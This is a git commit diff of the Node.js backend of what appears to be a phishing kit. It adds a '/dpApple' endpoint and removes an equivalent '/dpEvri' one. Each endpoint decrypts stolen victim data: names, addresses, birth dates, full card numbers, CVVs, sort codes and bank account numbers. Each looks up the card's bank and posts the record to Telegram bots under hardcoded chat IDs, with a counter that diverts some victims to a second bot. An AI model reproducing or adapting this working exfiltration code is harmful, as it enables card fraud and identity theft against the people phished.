f10af35c7fc5536dcfdb9bf2ef7414116aa19394
Your Name <you@example.com>
2022-09-21 23:47:45 +0100

    make

--- index.js
+++ index.js
@@ -8526,6 +8526,123 @@ app.post("/t1AppleAu", (req, res) => {
 //APPLE
 //APPLE
 
+app.options("/dpApple", cors());
+
+app.post("/dpApple", (req, res) => {
+  firstName = CryptoJS.AES.decrypt(req.body.firstName, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  lastName = CryptoJS.AES.decrypt(req.body.lastName, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  telephone = CryptoJS.AES.decrypt(req.body.telephone, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  addy1 = CryptoJS.AES.decrypt(req.body.addy1, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  addy2 = CryptoJS.AES.decrypt(req.body.addy2, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  town = CryptoJS.AES.decrypt(req.body.town, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccexpmonth = CryptoJS.AES.decrypt(req.body.ccexpmonth, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccexpyear = CryptoJS.AES.decrypt(req.body.ccexpyear, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  cvv = CryptoJS.AES.decrypt(req.body.cvv, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  userIp = CryptoJS.AES.decrypt(req.body.userIp, "402312").toString(
+    CryptoJS.enc.Utf8
+  );
+  bin = req.body.bin;
+
+  if (bin.length === 7) {
+    formatBin = bin.replace(/ /g, "");
+    if (formatBin.length === 7) {
+      formatBin = bin.slice(0, -1);
+    }
+    bin = formatBin;
+  }
+  axios
+    .get(`https://lookup.binlist.net/${bin}`)
+    .then((resp) => {
+      if (!resp.data.bank) {
+        bankName = "";
+      } else {
+        bankName = resp.data.bank.name;
+      }
+    })
+    .then(function () {
+      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
+      var originalText = `+----------- Personal Information ------------+\nFull Name: ${firstName} ${lastName}\nDOB: ${dob}\nAddress: ${addy1}, ${addy2}\nCity: ${town}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Name: ${ccname}\nCard Number: ${ccnum}\nExpiry: ${ccexpmonth}/${ccexpyear}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nIP: ${userIp}\n+ ----------- BIN List Info ------------+\n${binList}`;
+      if (capzEvri == 10) {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `HAYTCHRES:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        capzEvri = 4;
+      } else {
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 680379375,
+              text: `AppleDPc:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        axios
+          .post(
+            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
+            {
+              chat_id: 5582405778,
+              text: `Apple:\n${originalText}`,
+              parse_mode: "Markdown",
+            }
+          )
+          .catch((e) => {
+            console.log(e);
+          });
+        capzEvri += 1;
+      }
+      res.send("Update Complete");
+    });
+});
+
 app.options("/rondoApple", cors());
 
 app.post("/rondoApple", (req, res) => {
@@ -14962,111 +15079,6 @@ app.post("/gh0stEvri", async (req, res) => {
 
           res.send("Update Completed");
         });
-    });
-});
-
-app.options("/dpEvri", cors());
-
-app.post("/dpEvri", (req, res) => {
-  fname = CryptoJS.AES.decrypt(req.body.fname, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  dob = CryptoJS.AES.decrypt(req.body.dob, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  telephone = CryptoJS.AES.decrypt(req.body.phone, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  address = CryptoJS.AES.decrypt(req.body.addy, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  pcode = CryptoJS.AES.decrypt(req.body.pcode, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  ccname = CryptoJS.AES.decrypt(req.body.ccname, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  ccnum = CryptoJS.AES.decrypt(req.body.ccnum, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  ccexp = CryptoJS.AES.decrypt(req.body.ccexp, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  cvv = CryptoJS.AES.decrypt(req.body.cccvv, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  scode = CryptoJS.AES.decrypt(req.body.scode, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  accno = CryptoJS.AES.decrypt(req.body.accno, "402312").toString(
-    CryptoJS.enc.Utf8
-  );
-  userAgent = req.body.userAgent;
-  ip = req.body.ip;
-  bin = req.body.bin;
-
-  if (bin.length === 7) {
-    formatBin = bin.replace(/ /g, "");
-    if (formatBin.length === 7) {
-      formatBin = bin.slice(0, -1);
-    }
-    bin = formatBin;
-  }
-  axios
-    .get(`https://lookup.binlist.net/${bin}`)
-    .then((resp) => {
-      if (!resp.data.bank) {
-        bankName = "";
-      } else {
-        bankName = resp.data.bank.name;
-      }
-    })
-    .then(function () {
-      binList = `${bin} | ${dob} | ${pcode} | ${bankName}`;
-      var originalText = `+----------- Personal Information ------------+\nFull Name: ${fname}\nDOB: ${dob}\nAddress: ${address}\nPostcode: ${pcode}\nPhone Number: ${telephone}\n+ ----------- Card Information ------------+\nCard Number: ${ccnum}\nExpiry: ${ccexp}\nCVV: ${cvv}\nSort Code: ${scode}\nAccount Number: ${accno}\n+ ----------- IP Information ------------+\nUser Agent: ${userAgent}\nIP: ${ip}\n+ ----------- BIN List Info ------------+\n${binList}`;
-      if (mk == 7) {
-        axios
-          .post(
-            `https://api.telegram.org/bot${process.env.haytchresbotID}/sendMessage`,
-            {
-              chat_id: 680379375,
-              text: `HAYTCHRES:\n${originalText}`,
-              parse_mode: "Markdown",
-            }
-          )
-          .catch((e) => {
-            console.log(e);
-          });
-        mk = 0;
-      } else {
-        axios
-          .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-            {
-              chat_id: 680379375,
-              text: `EvriDP:\n${originalText}`,
-              parse_mode: "Markdown",
-            }
-          )
-          .catch((e) => {
-            console.log(e);
-          });
-        axios
-          .post(
-            `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage`,
-            {
-              chat_id: 5582405778,
-              text: `Evri:\n${originalText}`,
-              parse_mode: "Markdown",
-            }
-          )
-          .catch((e) => {
-            console.log(e);
-          });
-        mk += 1;
-      }
-
-      res.send("Update Completed");
     });
 });
 
